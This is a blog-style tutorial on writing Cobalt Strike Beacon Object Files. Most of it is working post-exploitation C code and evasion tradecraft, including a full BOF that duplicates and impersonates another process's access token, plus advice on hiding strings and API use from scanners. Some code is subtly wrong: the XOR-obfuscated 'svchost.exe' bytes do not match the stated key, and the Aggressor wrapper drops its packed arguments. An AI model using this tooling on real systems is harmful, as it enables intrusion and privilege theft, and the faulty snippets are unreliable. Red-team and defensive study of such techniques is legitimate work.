---
title: "Beacon Object Files from Scratch: COFF Loading, Dynamic Resolution, and Battle-Tested Tradecraft"
description: "A deep guide to writing Beacon Object Files - from understanding the COFF format and Cobalt Strike's BOF runtime to building a production-grade token-duplication BOF with BeaconPrintf, dynamic function resolution, and thread-safe cleanup."
date: 2026-04-09
difficulty: Hard
tags: [c2, cobalt-strike, bof, coff, windows, tradecraft]
---

## Why BOFs

In-process post-exploitation on Cobalt Strike used to mean one of two things: spawn a sacrificial process and run a full executable (noisy), or write a PowerShell script and pipe it through unmanaged PowerShell (AMSI, PS logging).

Beacon Object Files gave us a third option: **compile a C function, load it into the beacon's address space, run it, unload it**. No new process. No PowerShell. No on-disk artifact.

The trade-off is that BOFs are *constrained*. No CRT. No exceptions. No globals that persist across calls. You write small, focused, single-purpose capabilities. Get used to that shape and BOFs become your go-to primitive.

## The COFF Format in 5 Minutes

A BOF is a **COFF object file** - the same format MSVC produces with `/c` (compile, don't link). It contains:

```
┌──────────────────────┐
│ COFF File Header     │ machine, # sections, symbol table offset
├──────────────────────┤
│ Section Headers[]    │ .text, .rdata, .data, .bss metadata
├──────────────────────┤
│ Raw Section Data     │ machine code, constants, static data
├──────────────────────┤
│ Relocations[]        │ per-section: "patch offset X with symbol Y"
├──────────────────────┤
│ Symbol Table         │ function and import names
├──────────────────────┤
│ String Table         │ long symbol names
└──────────────────────┘
```

The beacon's BOF loader does five things:

1. Allocates RWX memory, copies each section to its proper place.
2. Walks the symbol table, resolves each external symbol:
   - Cobalt Strike API (`__imp_Beacon*`) → static dispatch table
   - `__imp_<module>$<function>` → `GetProcAddress(LoadLibrary(<module>), <function>)`
3. Walks the relocations, patches addresses in the copied sections.
4. Calls `go()` - your entry point.
5. Frees the memory when the task completes.

That's the entire mental model. No PE parser. No import table. Just relocations and a symbol-name convention.

## Your First BOF - `whoami` Rewritten

The canonical "hello BOF" gets the current user via the Token API:

```c
// whoami.c
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

void go(char* args, int length) {
    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: %d", GetLastError());
        return;
    }

    DWORD sz = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &sz);
    PTOKEN_USER tu = (PTOKEN_USER)LocalAlloc(LPTR, sz);
    ADVAPI32$GetTokenInformation(hToken, TokenUser, tu, sz, &sz);

    char name[256], domain[256];
    DWORD nameSz = 256, domainSz = 256;
    SID_NAME_USE use;
    ADVAPI32$LookupAccountSidA(NULL, tu->User.Sid, name, &nameSz, domain, &domainSz, &use);

    BeaconPrintf(CALLBACK_OUTPUT, "%s\\%s", domain, name);

    LocalFree(tu);
    KERNEL32$CloseHandle(hToken);
}
```

Compile with MSVC:

```
cl.exe /c /GS- /W4 whoami.c
```

`/GS-` disables stack cookies - stack cookies reference `__security_cookie`, which isn't available in BOF land.

Key patterns:

- **Dynamic import naming**: `<MODULE>$<function>` tells the beacon loader to resolve at runtime via LoadLibrary/GetProcAddress.
- **`DECLSPEC_IMPORT`** prevents MSVC from inlining or generating import stubs.
- **No string literals used directly with Windows APIs** - the `BeaconPrintf` format string is fine because it's passed to our own API, but `CreateFile("foo.txt")` would leave "foo.txt" in `.rdata` where strings scanners find it.

## Argument Parsing - The BeaconData API

Aggressor client-side sends typed arguments. The BOF consumes them:

```c
// Aggressor side (aggressor.cna):
//   bof_pack($1, "zi", "target.exe", 4096);

void go(char* args, int length) {
    datap parser;
    BeaconDataParse(&parser, args, length);

    char* name = BeaconDataExtract(&parser, NULL);       // z = zero-terminated string
    int   size = BeaconDataInt(&parser);                 // i = int32
    short port = BeaconDataShort(&parser);               // s = int16
    // Binary blob:
    int blobLen = 0;
    char* blob  = BeaconDataExtract(&parser, &blobLen);  // b = binary (reads length-prefixed)

    // ... use them
}
```

Pack format letters on the Aggressor side:

| Letter | Type | Reader |
|---|---|---|
| `z` | null-terminated string | `BeaconDataExtract` |
| `b` | binary blob (length-prefixed) | `BeaconDataExtract(&p, &len)` |
| `i` | 4-byte int | `BeaconDataInt` |
| `s` | 2-byte short | `BeaconDataShort` |

## Output - Three Channels

```c
BeaconPrintf(CALLBACK_OUTPUT, "fmt: %s", str);    // green, normal
BeaconPrintf(CALLBACK_ERROR,  "fmt: %d", err);    // red, error
BeaconOutput(CALLBACK_OUTPUT_UTF8, buf, buflen);  // raw byte output (non-ASCII safe)
```

Never call `printf`, `puts`, or `OutputDebugString`. They either don't resolve or go to a channel the operator can't see.

## Dynamic Function Resolution - Going Beyond `$`

The `MODULE$function` pattern only covers what you declared at compile time. For truly dynamic work - resolving `NtWhatever` syscalls, for example - you need runtime resolution:

```c
typedef NTSTATUS (NTAPI* NtOpenProcess_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

void go(char* args, int length) {
    HMODULE nt = KERNEL32$GetModuleHandleA("ntdll.dll");
    NtOpenProcess_t NtOpenProcess =
        (NtOpenProcess_t)KERNEL32$GetProcAddress(nt, "NtOpenProcess");

    // ... call NtOpenProcess ...
}
```

For OPSEC: **avoid plaintext API names in `.rdata`**. Use string stacking or simple XOR:

```c
char name[] = {'N','t','O','p','e','n','P','r','o','c','e','s','s',0};
NtOpenProcess_t NtOpenProcess = (NtOpenProcess_t)KERNEL32$GetProcAddress(nt, name);
```

MSVC will place the char array on the stack, not in `.rdata`.

## Battle-Tested Tradecraft

### 1. No Persistent State

BOFs are loaded, executed, unloaded. Globals don't survive between calls. If you need state, return it to the operator and pass it back in as an argument next call. Don't stash pointers in the Windows registry or named pipes thinking "the next BOF will pick it up."

### 2. Thread Safety

Beacon is single-threaded for BOF execution, but the APIs you call are not. If your BOF spawns a thread, **join it before returning**. An orphan thread outliving the BOF means its code was freed while still running - instant crash.

```c
HANDLE h = CreateThread(NULL, 0, MyWorker, NULL, 0, NULL);
WaitForSingleObject(h, INFINITE);     // required
CloseHandle(h);
```

### 3. Handle Hygiene

The beacon doesn't clean up after you. Every `OpenProcessToken`, `OpenProcess`, `RegOpenKeyEx` must have a matching `CloseHandle` / `RegCloseKey`. Leaks accumulate over multiple task runs and eventually make the beacon unstable.

### 4. Memory Allocation

`LocalAlloc`/`HeapAlloc` are fine - they use the process heap, which the beacon already has. Avoid `VirtualAlloc` unless you have a specific reason; it shows up in scanner telemetry.

### 5. String Obfuscation

Anything sensitive in `.rdata` is an IoC. For a capability that creates a specific registry key or opens a specific SCM service, XOR the string at compile time:

```c
#define XOR_KEY 0x42
void deobf(char* buf, int len) { for (int i = 0; i < len; i++) buf[i] ^= XOR_KEY; }

// Obfuscated "svchost.exe" = {0x21, 0x36, 0x22, 0x2a, 0x2d, 0x36, 0x36, 0x6c, 0x27, 0x3c, 0x27}
char svc[] = {0x21, 0x36, 0x22, 0x2a, 0x2d, 0x36, 0x36, 0x6c, 0x27, 0x3c, 0x27, 0x00};
deobf(svc, 11);
```

### 6. Entry-Point Is `go`

Always. You can have other `static` helpers in the same file. The loader only calls `go(args, length)`.

### 7. One Responsibility Per BOF

Writing a 900-line BOF that does recon, enum, lateral movement, and persistence is a code smell. Split into `enum_users`, `enum_shares`, `run_as`, `persist_run_key`. Composable small BOFs > one monolith.

## A Production Example: Steal Token BOF

Pulling it together - duplicate a target process's access token and impersonate:

```c
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES,
                                                          SECURITY_IMPERSONATION_LEVEL,
                                                          TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);

void go(char* args, int length) {
    datap p;
    BeaconDataParse(&p, args, length);
    DWORD pid = BeaconDataInt(&p);

    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed: %d", pid, GetLastError());
        return;
    }

    HANDLE hTok = NULL;
    if (!ADVAPI32$OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken: %d", GetLastError());
        KERNEL32$CloseHandle(hProc);
        return;
    }

    HANDLE hDup = NULL;
    if (!ADVAPI32$DuplicateTokenEx(hTok, TOKEN_IMPERSONATE | TOKEN_QUERY, NULL,
                                   SecurityImpersonation, TokenImpersonation, &hDup)) {
        BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx: %d", GetLastError());
        KERNEL32$CloseHandle(hTok);
        KERNEL32$CloseHandle(hProc);
        return;
    }

    if (ADVAPI32$ImpersonateLoggedOnUser(hDup)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Impersonating token of PID %d", pid);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateLoggedOnUser: %d", GetLastError());
    }

    KERNEL32$CloseHandle(hDup);
    KERNEL32$CloseHandle(hTok);
    KERNEL32$CloseHandle(hProc);
}
```

Aggressor wrapper:

```lua
alias steal_token {
    local('$bid $pid $barch $script');
    $bid = $1;
    $pid = $2;
    $barch = barch($bid);
    $script = script_resource("steal_token.x64.o");

    bof_pack($bid, "i", $pid);
    beacon_inline_execute($bid, readbof($bid, $script), "go", $null);
}

beacon_command_register("steal_token", "Duplicate target PID token & impersonate",
    "Usage: steal_token <pid>");
```

## Debugging BOFs

BOFs crash silently. The beacon reports "task completed" even when you segfaulted. Your debug workflow:

1. **Compile with** `/Zi` and a PDB, then run the BOF through `bof_runner` (trustedsec) which loads a COFF with a real debugger attached.
2. **Log aggressively** - `BeaconPrintf` at every branch.
3. **Test locally first** - build a small `main()` that calls `go(args, len)` with synthetic arguments, run it under WinDbg, catch crashes.

## Summary

BOFs are a small, sharp tool. Once you internalize the "no CRT, no globals, one responsibility, dynamic resolution" model, they become the fastest way to add capability to your engagement - days, not weeks.

> The PE loader is a complex beast. The BOF loader is 300 lines and two data structures. Everything great about in-process execution traces back to that simplicity.
